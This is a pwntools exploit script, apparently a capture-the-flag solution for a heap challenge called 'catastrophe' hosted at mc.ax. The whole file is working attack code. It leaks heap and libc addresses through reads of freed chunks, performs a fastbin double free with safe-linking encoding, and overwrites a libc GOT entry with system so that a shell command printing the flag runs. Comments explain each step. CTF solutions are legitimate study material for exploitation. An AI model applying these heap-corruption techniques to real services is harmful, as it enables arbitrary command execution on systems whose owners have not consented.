#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("./catastrophe")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

host, port = "mc.ax", "31273"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

def alloc(idx,size,data):
  p.sendlineafter('> ', '1')
  p.sendlineafter('Index?\n', str(idx))
  p.sendlineafter('Size?\n', str(size))
  p.sendlineafter('content: ', data)

def free(idx):
  p.sendlineafter('> ', '2')
  p.sendlineafter('Index?\n', str(idx))

def view(idx):
  p.sendlineafter('> ', '3')
  p.sendlineafter('Index?\n', str(idx))


# alloc 9 tcache chunks
for i in range(9):
  alloc(i,0x200,'A')

# free 8 tcache chunks, (last one goes to unsorted)
for i in range(8):
  free(i)

# leak heap address
view(0)
p.recvuntil(b'\x3e\x20',drop=True)
heap = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00')) << 12
print('heap = '+hex(heap))

# leak libc address
view(7)
p.recv(2)
leak = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00'))
print('leak = '+hex(leak))
libc.address = leak - 0x219ce0
print('libc base = '+hex(libc.address))

# allocate 10 tcache 0x30 chunks
for i in range(10):
  alloc(i,0x28,'B')

# free 7 0x30 tcache chunks, to fill tcache
for i in range(7):
  free(i)

# double free in fastbins (0x30 size)
free(7)
free(8)
free(7)

# free tcache 0x30 line
for i in range(7):
  alloc(0,0x28,'B')

# now does fastbin dup attack,  as chunk will move to tcache needs to encode target address with safe linking
alloc(0,0x28,p64((libc.address + 0x219090) ^ ((heap+0x1260)>>12)) + p64(heap+0x10))
alloc(1,0x28, 'cat flag*;echo PIPO\x00')
alloc(2,0x28, 'cat flag*;echo PIPO\x00')
#
alloc(3,0x28,p64(libc.address+0x19f1c0)+ p64(libc.sym['system']))

# now puts , will call system , because we modify got entry callex by puts (strlen), so execute command in chunk 2
p.sendline('3')
p.clean()
p.sendline('2')
print(p.recvuntil('PIPO',drop=True))
p.clean()

p.interactive()


